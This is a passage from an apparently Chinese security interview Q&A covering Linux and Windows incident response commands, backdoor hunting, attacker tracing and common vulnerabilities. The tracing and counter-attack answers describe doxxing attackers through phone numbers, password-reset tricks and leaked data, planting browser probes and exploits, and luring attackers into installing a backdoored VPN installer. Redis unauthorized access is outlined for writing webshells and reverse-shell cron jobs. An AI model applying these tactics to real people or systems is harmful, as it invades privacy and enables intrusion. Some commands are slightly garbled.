<li><p>查看除 <code>root</code> 帐号外，其他帐号是否存在 <code>sudo</code> 权限：<code>more /etc/sudoers | grep -v &quot;^#\|^end-inline-katex--&gt;&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
</li>
<li><p>禁用或删除多余及可疑的帐号：</p>
<p><code>usermod -L user</code>：禁用帐号，帐号无法登录，<code>/etc/shadow</code> 第二栏为 <code>!</code> 开头。</p>
<p><code>userdel user</code>：删除 <code>user</code> 用户。</p>
<p><code>userdel -r user</code>：将删除 <code>user</code> 用户，并且将 <code>/home</code> 目录下的 user 目录一并删除。</p>
</li>
</ul>
<p><strong>端口和进程</strong></p>
<p>端口、进程</p>
<ul>
<li><p>端口</p>
<ul>
<li><p>查看端口：<code>netstat -antlp | more</code> </p>
<p>查看 <code>pid</code> 对应的进程文件路径：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /proc/<span class="variable">$PID</span>/exe</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">$ file /proc/<span class="variable">$PID</span>/exe</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>查看连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -antlp | grep ESTABLISHED</span><br><span class="line">$ netstat -antlp | grep LISTEN</span><br></pre></td></tr></table></figure>
<p>进程</p>
<ul>
<li><p>查看进程：`ps aux | grep c194a9eg</p>
</li>
<li><p>隐藏进程查看：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef | awk <span class="string">'&#123;print&#125;'</span> | sort -n | uniq &gt;1</span><br><span class="line">$ ls /proc | sort -n |uniq &gt;2</span><br><span class="line">$ diff 1 2</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>查看相关文件和路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ lsof -p [PID]</span><br><span class="line">$ pwdx [PID]</span><br></pre></td></tr></table></figure>
<p><strong>服务</strong></p>
<p>服务管理、入侵排查</p>
<ul>
<li><p>服务管理</p>
<ul>
<li>使用 chkconfig 或者 systemctl 可以设置服务自启</li>
<li>修改 <code>/etc/re.d/rc.local</code> 加入 <code>/etc/init.d/servername start</code> 也可实现自启</li>
</ul>
</li>
<li><p>入侵排查</p>
<ul>
<li><p>CentOS 查询已安装的服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ chkconfig  --list <span class="comment"># 查看服务自启动状态</span></span><br><span class="line">$ ps aux | grep crond  <span class="comment"># 查看当前服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统在3与5级别下的启动项 </span></span><br><span class="line"><span class="comment"># 中文环境</span></span><br><span class="line">$ chkconfig --list | grep <span class="string">"3:启用\|5:启用"</span></span><br><span class="line"><span class="comment"># 英文环境</span></span><br><span class="line">$ chkconfig --list | grep <span class="string">"3:on\|5:on"</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><ul>
<li><p>源码安装的服务</p>
<p>搜索 <code>/etc/rc.d/init.d</code> 目录，查看是否存在。</p>
</li>
</ul>
</li>
</ul>
<p><strong>文件分析</strong></p>
<p>查找、查看文件创建修改时间、访问时间、文件权限 ACL</p>
<ul>
<li><p>查找</p>
<ul>
<li>找出 <code>/opt</code> 下一天前访问过的文件：<code>find /opt -iname &quot;*&quot; -atime 1 -type f</code></li>
<li>查找一天内被修改的 <code>jsp</code> 文件：<code>find ./ -mtime 0 -name &quot;*.jsp&quot;</code></li>
<li>查看 <code>72</code> 小时内新增的文件：<code>find / -ctime -2</code></li>
<li>查看 <code>777</code> 权限的文件：<code>findd / *.jsp -perm 4777</code></li>
<li>查看更改时间：<code>stat  [文件]</code></li>
</ul>
</li>
<li><p>查看文件创建修改时间、访问时间</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -alt /bin/* | head -n 5</span><br><span class="line">$ <span class="built_in">stat</span> /usr/bin/lsof</span><br></pre></td></tr></table></figure>
</li>
<li><p>文件权限 ACL</p>
<p>获取文件权限：<code>getfacl 1.cap</code></p>
<p>添加文件权限：<code>setfacl</code></p>
</li>
</ul>
<p><strong>日志分析</strong></p>
<p>日志目录、日志分析、软件卸载安装日志</p>
<ul>
<li><p>日志目录</p>
<ul>
<li><p>日志默认存放位置：<code>/var/log</code> 日志配置情况：<code>more /etc/rsyslog.conf</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;cron #记录了系统定时任务相关的日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;cups #记录打印信息的日志</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;dmesg #记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mailog #记录邮件信息</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;message #记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;btmp #记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;lastlog #记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;wtmp #永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;utmp #记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;secure #记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>日志分析</p>
<ul>
<li><p>ssh 查看 IP 爆破主机 root 账号情况</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定位IP</span></span><br><span class="line">$ grep <span class="string">"Failed password for root"</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">'&#123;print $11&#125;'</span> | sort | uniq -c | sort -</span><br><span class="line"><span class="comment"># 查看爆破的字典</span></span><br><span class="line">$ grep <span class="string">"Failed password"</span> /var/<span class="built_in">log</span>/secure|perl -e <span class="string">'while($_=&lt;&gt;)&#123; /for(.*?) from/; print "$1\n";&#125;'</span>| uniq -c | sort -nr</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>查看登录成功的 IP</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grep <span class="string">"Accepted "</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">'&#123;print $11&#125;'</span> | sort | uniq -c | sort -nr | more</span><br><span class="line"><span class="comment"># 登录成功的日期、用户名、IP：</span></span><br><span class="line">$ grep <span class="string">"Accepted "</span> /var/<span class="built_in">log</span>/secure | awk <span class="string">'&#123;print $1,$2,$3,$9,$11&#125;'</span></span><br></pre></td></tr></table></figure>
<p>用户操作</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">$ grep <span class="string">"useradd"</span> /var/<span class="built_in">log</span>/secure</span><br><span class="line"><span class="comment"># 删除用户</span></span><br><span class="line">$ grep <span class="string">"userdel"</span> /var/<span class="built_in">log</span>/secure</span><br></pre></td></tr></table></figure>
<ul>
<li>软件卸载安装日志：<code>more /var/log/yum.log</code></li>
</ul>
<p><strong>病毒查杀工具</strong></p>
<ul>
<li><p>查杀 Rootkit：chkrootkit、rkhunter</p>
</li>
<li><p>病毒查杀：clamav</p>
<ul>
<li><p>升级病毒库：<code>end-inline-katex--&gt; /opt/clamav/bin/freshclam</code></p>
</li>
<li><p>扫描所有用户的主目录：`c194a9eg</p>
</li>
<li><p>扫描 <code>bin</code> 目录并且显示有问题的文件的扫描结果：<code>end-inline-katex--&gt; ./clamscan -r --bell -i /bin</code></p>
</li>
<li><p>扫描：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">$ clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">$ clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>扫描并杀毒：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ clamscan -r --remove  /usr/bin/bsd-port</span><br><span class="line">$ clamscan -r --remove  /usr/bin/</span><br><span class="line">$ clamscan -r --remove  /usr/<span class="built_in">local</span>/zabbix/sbi</span><br></pre></td></tr></table></figure>
<p>扫描并杀毒：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">$ clamscan -r  --remove  /usr/bin/</span><br><span class="line">$ clamscan -r --remove  /usr/<span class="built_in">local</span>/zabbix/sbi</span><br></pre></td></tr></table></figure>
<ul>
<li><ul>
<li>查看日志发现：`c194a9eg</li>
</ul>
</li>
</ul>
<h3 id="问二十一：常见windows系统后门排查"><a href="#问二十一：常见windows系统后门排查" class="headerlink" title="问二十一：常见windows系统后门排查"></a>问二十一：常见windows系统后门排查</h3><ol>
<li>工具列表： Pchunter 恶意代码检测工具</li>
<li>后门排查思路：<br>注册表启动项<br>恶意进程<br>系统服务<br>网络连接<br>计划任务  </li>
<li>思路一：  Shift 粘滞键后门<br>检查 <code>C:\Windows\sysytem32\sethc.exe</code> 或者 按 5 下 Shift 键</li>
<li>思路二：NTFS（ADS）数据流（后门或者 WebShell）<br>检查方法：<br>\1. 使用 “dir \r” 检查目标目录中是否存在使用 NTFS 数据流隐藏的文件 2. 如果存在，就使用 “notpad 文件名：NTFS 隐藏文件名” 来查看隐藏的文件的内容是什么。 <code>dir /r /s</code> 连带子目录的文件一起检查</li>
<li>思路三：系统日志 查看是否存在恶意登陆情况 1. 使用 Logparser 格式化后进行分析 2. 直接打开 winodws 控制面板 - 管理工具 - 事件查看器进行分析，比如我们要筛选是否存在。 3389 rdp 暴力破解行为的话，只要在 “安全” 日志中筛选事件 ID 为 4624（登陆成功）和 4625 （登陆失败）</li>
</ol>
<h3 id="问二十二：常见linux系统后门排查"><a href="#问二十二：常见linux系统后门排查" class="headerlink" title="问二十二：常见linux系统后门排查"></a>问二十二：常见linux系统后门排查</h3><ol>
<li>检查异常帐号 <code>cat /etc/passwd</code></li>
<li>检查异常登陆： <code>who</code> 查看当前登陆用户 (tty 本地登陆、pts 远程登陆) <code>w</code> 查看当前系统信息，想知道某一刻用户的行为 <code>last</code> 列出所有用户登陆信息 <code>lastb</code> 列出所有用户登陆失败的信息 <code>lastlog</code> 列出所有用户最近一次登陆信息</li>
<li>查看历史命令： <code>cat ~/.bash_history</code></li>
<li>网络连接： <code>netstat -pant1</code></li>
<li>查看进程： <code>ps -ef | more</code> 锁定实际运行程序的符号链接 <code>ls -la /prc//exe</code> <code>lsof -p</code></li>
<li>计划任务： <code>crontab -l</code>  列出计划任务列表 <code>crontab -e</code>  编辑计划任务，当计划任务出现不可字符时，需要此命令才能看到具体信息 <code>ls -la /var/spool/cron/</code>  查看计划任务文件 <code>more /etc/crontab</code></li>
<li>系统启动项： <code>more /etc/rc.local</code> <code>ls -l /etc/rc.d/rc[0~6].d</code>  优先看 rc3.d <code>more /etc/ld.so.preload</code>  linux 动态链接库</li>
<li>系统日志： <code>/var/log/secure</code>  SSH 登陆日志、su 切换用户日志，只要涉及帐号和密码的程序都会记录 <code>/var/log/message</code>  记录系统重要信息的日志，这个日志文件中会记录 Linux 系统的绝大多数重要信息 <code>/var/log/cron</code>  计划任务日志 <code>/var/log/wtmp</code>  记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件，这个文件是二进制文件用 last</li>
<li>Rootkit 查杀： <code>chkrootkit</code> <code>rkhunter</code></li>
</ol>
<h3 id="问二十三：溯源技巧"><a href="#问二十三：溯源技巧" class="headerlink" title="问二十三：溯源技巧"></a>问二十三：溯源技巧</h3><p>对外溯源：确认攻击者的真实身份 </p>
<p>对内溯源：确认攻击者的行为 对内溯源 对内主要是溯源攻击者的行为，如果攻击者已经攻击成功了，攻击者肯定要上传攻击工具的，看一下他上传的什么工具。第一时间对其进行阻断，把 shell  先暂时干掉。干掉的同时，再去看外部日志 Apache 日志。通过攻击者上传 shell 的时间和攻击  IP，去索引搜索整个日志，然后看攻击者做了哪些请求，如果是 Get 请求可以看对方请求的一个资源、地址以及请求的内容；如果说是 Post  请求，攻击者应该是做了一些上传的操作，但是具体上传了什么东西，是不知道的，只能看到一个上传数据包，  不过可以通过防火墙去下载该完整的数据包，进行分析。 再之后，就进入了应急响应的一个流程。 对外溯源 <em>通过监测设备上面确定攻击 IP，确定是攻击者发起的请求，那么就通过这个 IP 确定域名，通过该域名查找到关于攻击者注册域名的一些相关信息。</em>通常会有 QQ 账号、QQ 邮箱等个人真实信息，再借助这些有效信息去社工。</p>
<p>通常情况下，接到溯源任务时，获得的信息如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">攻击时间</span><br><span class="line">攻击 IP</span><br><span class="line">预警平台</span><br><span class="line">攻击类型</span><br><span class="line">恶意文件</span><br><span class="line">受攻击域名&#x2F;IP</span><br></pre></td></tr></table></figure>
<p>其中攻击 IP、攻击类型、恶意文件、攻击详情是溯源入手的点。</p>
<p>通过攻击类型分析攻击详情的请求包，看有没有攻击者特征，通过获取到的 IP 地址进行威胁情报查询来判断所用的 IP 具体是代理 IP 还是真实 IP 地址。</p>
<p>如端口扫描大概率为个人 vps 或空间搜索引擎，在接到大量溯源任务时可优先溯源。</p>
<p>如命令执行大概率为未经任何隐匿的网络、移动网络、接到脚本扫描任务的肉鸡，在接到大量溯源任务时可优先溯源。</p>
<p>如爬虫大概率为空间搜索引擎，可放到最后溯源。 </p>
<p>如恶意文件可获得 c2 地址、未删除的带有敏感信息的代码（如常用 ID、组织信息）、持续化控制代码（C2 地址指在 APT 攻击里的命令与控制，若获取到 C2 地址可以使我们的溯源目标更有针对性） </p>
<p>持续化控制代码需要详细分析，如采用 DGA 域名上线的方法，分析出域名算法，预测之后的域名可有效减少损失，增加溯源面。</p>
<p><strong>攻击痕迹清晰</strong></p>
<ul>
<li>安全设备分析（若有）</li>
<li>系统日志分析</li>
</ul>
<p>目的：获取对方攻击的时间节点，攻击方式，获取病毒文件，拿到攻击者的虚拟身份，最后攻击者复现</p>
<p><strong>攻击痕迹不清晰</strong></p>
<p>进行漏洞挖掘</p>
<p>相关人员询问</p>
<h3 id="问二十四：溯源反制"><a href="#问二十四：溯源反制" class="headerlink" title="问二十四：溯源反制"></a>问二十四：溯源反制</h3><p>在发现资产被攻击之后，防守方需要及时进行溯源和排查，通常情况下，溯源需要获取到目标攻击者的一部分个人信息，比如手机号，邮箱，QQ 号，微信号等，通过这些信息在互联网可以进一步追溯攻击者的画像。</p>
<ul>
<li>比如拿到数据：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">web攻击事件-11</span><br><span class="line">攻击时间: 2021-08-17 09:09:99</span><br><span class="line">攻击IP : 49.70.0.xxx</span><br><span class="line">预警平台：天眼/绿盟/ibm/长亭waf</span><br><span class="line"></span><br><span class="line">攻击类型: 植入后门文件</span><br><span class="line">处置方式: 封禁需溯源</span><br><span class="line">目标域名: 10.0.0.1</span><br><span class="line">www.baidu.com</span><br></pre></td></tr></table></figure>
<ul>
<li>流程</li>
</ul>
<p>1、针对 IP 通过开源情报 + 开放端口分析查询</p>
<p>首先通过威胁情报平台确认攻击 ip 是否为威胁 ip，常用的平台通常有如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;x.threatbook.cn&#x2F; 微步在线威胁情报社区</span><br><span class="line">https:&#x2F;&#x2F;ti.qianxin.com&#x2F; 奇安信威胁情报中心</span><br><span class="line">https:&#x2F;&#x2F;ti.360.cn&#x2F; 360威胁情报中心</span><br><span class="line">https:&#x2F;&#x2F;www.venuseye.com.cn&#x2F;  </span><br><span class="line">VenusEye威胁情报中心</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 域名反查</span><br><span class="line">站长之家IP查询网址：https:&#x2F;&#x2F;ip.tool.chinaz.com&#x2F;ipbatch</span><br><span class="line">IP138查询网：https:&#x2F;&#x2F;www.ip138.com&#x2F;</span><br><span class="line">高精度IP定位：https:&#x2F;&#x2F;www.opengps.cn&#x2F;Data&#x2F;IP&#x2F;LocHighAcc.aspx</span><br><span class="line">IP信息查询：https:&#x2F;&#x2F;www.ipip.net&#x2F;ip.html&#x2F;</span><br><span class="line">IP地址查询在线工具：https:&#x2F;&#x2F;tool.lu&#x2F;ip&#x2F;</span><br><span class="line">多地Ping检测：http:&#x2F;&#x2F;ping.chinaz.com&#x2F;</span><br><span class="line">Whois查询：https:&#x2F;&#x2F;whois.chinaz.com&#x2F;</span><br></pre></td></tr></table></figure>
<p>当发现 IP 的为攻击 IP 后，可以尝试通过此 IP 去溯源攻击者，具体实现过程通常会用到下述方法： </p>
<ol>
<li>ip 反查域名</li>
<li>域名查 whois 注册信息</li>
<li>域名查备案信息、反查邮箱、反查注册人 <a href="http://whoissoft.com/" target="_blank" rel="noopener">http://whoissoft.com/</a></li>
<li>邮箱反查下属域名</li>
<li>注册人反查下属域名</li>
</ol>
<p>然后，在端口：我们可以可查看一些开放服务进行进一步利用</p>
<p>再通过 nmap 对开放端口进行识别</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 3389,3306,6378 -Pn IP</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>7001/7002</th>
<th>WebLogic 控制台</th>
<th>反序列化、控制台弱口令</th>
</tr>
</thead>
<tbody>
<tr>
<td>3389</td>
<td>RDP 远程端口连接</td>
<td>shift 后门、爆破、ms12-020、CVE-2019-0708</td>
</tr>
<tr>
<td>6379</td>
<td>Redis 数据库</td>
<td>可尝试为授权访问、弱口令爆破</td>
</tr>
<tr>
<td>27017/27018</td>
<td>MongoDB 数据库</td>
<td>爆破、未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>Mysql 数据库</td>
<td>注入、提权、爆破</td>
</tr>
<tr>
<td>1521</td>
<td>Oracle 数据库</td>
<td>TNS 爆破、注入、反弹 shell</td>
</tr>
<tr>
<td>53</td>
<td>DNS 域名服务器</td>
<td>允许区域传送、DNS 劫持、缓存投毒、欺骗、CVE-2020-1350</td>
</tr>
<tr>
<td>21</td>
<td>FTP 文件传输协议</td>
<td>允许匿名的上传、下载、爆破和嗅探操作</td>
</tr>
<tr>
<td>22</td>
<td>SSH 远程连接</td>
<td>爆破、SSH 隧道及内网代理转发、文件传输</td>
</tr>
<tr>
<td>23</td>
<td>Telnet 远程连接</td>
<td>爆破、嗅探、弱口令</td>
</tr>
<tr>
<td>25</td>
<td>SMTP 邮件服务</td>
<td>邮件伪造</td>
</tr>
</tbody>
</table>
</div>
<p><strong>2、查询定位</strong></p>
<p>通过蜜罐等设备获取真实 IP，对 IP 进行定位，可定位具体位置。</p>
<p>定位 IP 网站：<a href="https://www.opengps.cn/Data/IP/ipplus.aspx" target="_blank" rel="noopener">https://www.opengps.cn/Data/IP/ipplus.aspx</a></p>
<p><strong>3、得到常用 ID 信息收集：</strong></p>
<p>(1) 百度信息收集：“id” （双引号为英文）</p>
<p>(2) 谷歌信息收集</p>
<p>(3) src 信息收集（各大 src 排行榜，如果有名次交给我套路）</p>
<p>(4) 微博搜索（如果发现有微博记录，可使用 tg 查询 weibo 泄露数据）</p>
<p>(5) 微信 ID 收集：微信进行 ID 搜索（直接发钉钉群一起查）</p>
<p>(6) 如果获得手机号（可直接搜索支付宝确定目标姓氏、淘宝找回密码确定目标名字、社交账户等）</p>
<p>注意：获取手机号如果自己查到的信息不多，直接上报企业微信 / 钉钉群（利用共享渠道对其进行二次社工）</p>
<p>(7) 豆瓣 / 贴吧 / 知乎 / 脉脉 你能知道的所有社交平台，进行信息收集</p>
<p><strong>4、预警设备信息取证：</strong></p>
<p>上方数据一无所获，可考虑对其发起攻击的行为进行筛查，尝试判断其是否有指纹特征。</p>
<p>如看看不能上传 webshell ，在 webshell 中植入 probe.js，在 webshell 中增加 canvas 探针，获取  CPU，主板什么信息，如果对方用的 chrome 的话，并存在 Chrome UAF 0day ，CS 免杀客户端获得微信 ID</p>
<p><strong>5、跳板机信息收集（触发）：</strong></p>
<p>进入红队跳板机查询相关信息</p>
<p>如果主机桌面没有敏感信息，可针对下列文件进行信息收集</p>
<p>last：查看登录成功日志</p>
<p>cat ~/.bash_history  ：查看操作指令</p>
<p>ps -aux #查看进程</p>
<p>查看是否有类似 ID 的用户</p>
<p>重点关注 uid 为 500 以上的登录用户</p>
<p>nologin 为不可登录</p>
<p>注意：手机号、昵称 ID 均为重点数据，如查不到太多信息，直接上报指挥部。</p>
<ul>
<li><p>附:</p>
<ul>
<li><p>攻击者上传了恶意程序的话：</p>
<p>如果攻击者在恶意攻击过程中对目标资产上传攻击程序（如后门、恶意脚本、钓鱼程序等），我们可通过对攻击者上传的恶意程序进行分析，并通过 IP 定位等技术手段对攻击进行分析溯源，常用的恶意程序分析网站有：</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">微步在线云沙箱：https://s.threatbook.cn/</span><br><span class="line">腾讯哈勃：https://habo.qq.com/</span><br><span class="line">Virustotal：https://www.virustotal.com/gui/home/upload</span><br><span class="line">火眼：https://fireeye.ijinshan.com</span><br><span class="line">魔盾安全分析：https://www.maldun.com/analysis/</span><br></pre></td></tr></table></figure>
</li>
<li><ul>
<li><p>如果攻击者被蜜罐捕获的话：</p>
<p>蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。</p>
<ul>
<li><p>蜜罐溯源的两种常见方式：</p>
<p>一种是在伪装的网站上插入特定的 js 文件，该 js 文件使用攻击者浏览器中缓存的 cookies 去对各大社交系统的 JSONP、XSS、CSRF 接口获取攻击者的 ID  和手机号等。另一种是在伪装的网站上显示需要下载某插件，该插件一般为反制木马，控制了攻击者的主机后查询敏感文件、浏览器访问记录等个人敏感信息从而锁定攻击者。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="问二十五：邮件钓鱼如何反制"><a href="#问二十五：邮件钓鱼如何反制" class="headerlink" title="问二十五：邮件钓鱼如何反制"></a>问二十五：邮件钓鱼如何反制</h3><p>我们防守的客户单位就收到了钓鱼邮件，庆幸的是客户总体安全意识很强，加上有邮件沙箱的加持，并没有实际人员中招，而我们将计就计，部署一套虚假的内网环境，伪造钓鱼邮件中招假象，中招人员画像和机器环境编排：</p>
<p><strong>名字：</strong>许晋 （jinxu）</p>
<p><strong>身份：</strong>巡检职员</p>
<p><strong>平时上机内容：</strong>看视频、打游戏、巡检</p>
<p><strong>系统软件：</strong>Office 三件套，搜狗输入法，QQ, 微信，Xmind, 谷歌浏览器，Winrar, 迅雷，百度网盘，Everything, 爱奇艺，腾讯视频，QQ 音乐，网易云音乐，FastStone Capture….</p>
<p><strong>系统环境：</strong>除了部署一些常见的系统软件，我们还要创建一系列工作文档（手工伪造、由客户提供非敏感公开数…），并在众多的工作文档中携带了我们部署的免杀后门（伪装成 VPN 安装包或办公软件）。</p>
<p><strong>目的：</strong>点开钓鱼邮件的附件，假装中招后，让攻击者在翻当前 PC 机器的时候寻找到我们投下的假密码本，并结合 VPN 安装包，使得攻击者下载 VPN 安装包并进行安装，从而进行反向控制。</p>
<h1 id="三、漏洞相关"><a href="#三、漏洞相关" class="headerlink" title="三、漏洞相关"></a>三、漏洞相关</h1><h3 id="问二十六：打点一般会用什么漏洞"><a href="#问二十六：打点一般会用什么漏洞" class="headerlink" title="问二十六：打点一般会用什么漏洞"></a>问二十六：打点一般会用什么漏洞</h3><p>优先以 java 反序列化这些漏洞像 shiro，fastjson，weblogic，用友 oa 等等进行打点，随后再找其他脆弱性易打进去的点。</p>
<p>因为 javaweb 程序运行都是以高权限有限运行，部分可能会降权。</p>
<h3 id="问二十七：-描述外网打点的流程？"><a href="#问二十七：-描述外网打点的流程？" class="headerlink" title="问二十七： 描述外网打点的流程？"></a>问二十七： 描述外网打点的流程？</h3><p>靶标确认、信息收集、漏洞探测、漏洞利用、权限获取。最终的目的是获取靶标的系统权限 / 关键数据。在这个过程中，信息收集最为重要。掌握靶标情报越多，后续就会有更多的攻击方式去打点。比如：钓鱼邮件、web 漏洞、边界网络设备漏洞、弱口令等。</p>
<h3 id="问二十八：什么是钓鱼网站？"><a href="#问二十八：什么是钓鱼网站？" class="headerlink" title="问二十八：什么是钓鱼网站？"></a>问二十八：什么是钓鱼网站？</h3><p>网络钓鱼攻击者利用欺骗性的电子邮件和伪造的 Web  站点来进行诈骗活动，受骗者往往会泄露自己的财务数据，如信用卡号、帐户用户名和口令等内容。诈骗者通常会将自己伪装成知名银行、在线零售商和信用卡公司等可信的站点，在所有接触诈骗信息的用户中，有高达 5% 的人都会对这些骗局做出响应 。 </p>
<h3 id="问二十九：你漏洞利用过没？"><a href="#问二十九：你漏洞利用过没？" class="headerlink" title="问二十九：你漏洞利用过没？"></a>问二十九：你漏洞利用过没？</h3><p>有一个 redis 的未授权访问漏洞，redis 在默认的情况下会绑定在 0.0.0.0:6379,  如果防火墙没有做策略限制，则外网可以访问到 redis 上，如果没有设置 redis  密码（默认为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis  的数据（这对于用于验证码码来说威胁很大），而且攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config  命令像目标主机写 WebShell、写 SSH 公钥、创建计划任务反弹 Shell 等。</p>
<h3 id="问三十：常见的中间件漏洞有那些？"><a href="#问三十：常见的中间件漏洞有那些？" class="headerlink" title="问三十：常见的中间件漏洞有那些？"></a>问三十：常见的中间件漏洞有那些？</h3><p>IIS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT漏洞、短文件名猜解、远程代码执行、解析漏洞</span><br></pre></td></tr></table></figure>
<p>Apache</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析漏洞、目录遍历</span><br></pre></td></tr></table></figure>
<p>Nginx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件解析、目录遍历、CRLF注入、目录穿越</span><br></pre></td></tr></table></figure>
<p>Tomcat</p>
